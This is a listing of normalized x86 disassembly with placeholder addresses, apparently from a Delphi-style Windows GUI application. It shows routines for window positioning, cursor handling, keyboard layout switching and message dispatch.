mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_44ccd0
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_451374
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46cd3c
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b224
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_45220c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4522eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4522f2
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_453a88
mov dl [ ebx + 0x184 ]
call sub_45872c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b19c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407ee4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46af9c
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46af9c
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46af9c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_4522f8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_452382
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452389
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b19c
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407ee4
test eax eax
je r-xdata
mov eax ebx
call sub_453a88
mov dl 0x1
call sub_458710
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_4523e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_416e24
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_44e340
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_452434
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_452468
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_40338c
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_40338c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4524a8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_44e340
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_452500
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_420c5c
mov edx [ r-xdata ]
call sub_403340
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_452538
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_418470
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45255c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_453a88
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_4525b8
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_452524
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_418470
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_4525f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4057a4
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4057a4
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_452664
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_45270c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452713
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_44ae38
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403190
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_40578c
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_40338c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4057a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ edi + 0x178 ] eax
sub_45271c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_450320
xor edx edx
push ebp
push sub_4527de
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_40338c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4527e5
mov eax [ ebp - 0x4 ]
call sub_450328
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_4527e5
mov eax [ ebp - 0x4 ]
call sub_464518
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_44d3ec
sub_452830
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4030d8
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f000
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_45289a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_44d3ec
sub_4528b4
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_4528dc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_464518
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_464420
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_40338c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4528dc
test al al
jne r-xdata
sub_452944
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4528dc
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_454bf4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452970
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4528dc
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_454bf4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45299c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_4529c4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_464518
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_464420
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_40338c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4529c4
test al al
jne r-xdata
sub_452a2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4529c4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452a4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4529c4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452a8c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_464518
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_40338c
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_452a8c
test al al
jne r-xdata
sub_452af0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452a8c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452b10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4507b8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45077c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_44e340
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452b10
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_452bc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_452b10
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_464518
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_44e340
test eax eax
jne r-xdata
sub_452c68
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451708
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452c88
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451708
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452cbc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451708
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452cdc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_452d2c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_452d50
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_44c458
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4507b8
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_45077c
mov dl [ esp ]
mov si 0xffd1
call sub_40338c
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_452da8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_40338c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_452dcc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_40338c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_452e04
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ee14
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_450818
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_451028
sub_452e3c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_40338c
pop esi
pop ebx
retn
mov eax ebx
call sub_44d7d0
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4043e0
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4043e0
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_452ebc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451408
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44eee8
sub_452f1c
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_45117c
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_450578
pop ebx
retn
sub_452f4c
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_452f74
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_450578
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_452fe4
push ebx
mov ebx eax
mov eax ebx
call sub_44ed54
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_450818
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_423a54
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_44e340
sub_453020
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_44ba38
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_453a88
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_44e340
sub_453060
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_453d8c
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_453a88
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4530a0
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_450818
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_453990
sub_4530e0
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_453bc8
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_453bc8
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_453140
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_44dd9c
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_44ccd0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_451374
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_4531b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ee8c
mov edx esi
mov eax ebx
call sub_4507d8
pop esi
pop ebx
retn
sub_4531cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_44a074
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_464518
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_40338c
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_40338c
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_40338c
test al al
jne r-xdata
sub_453260
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_454bf4
mov edx esi
mov eax ebx
call sub_4531cc
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44e340
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_44e340
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44e340
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464518
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44e340
test eax eax
jne r-xdata
jmp r-xdata
sub_453344
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_44e340
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
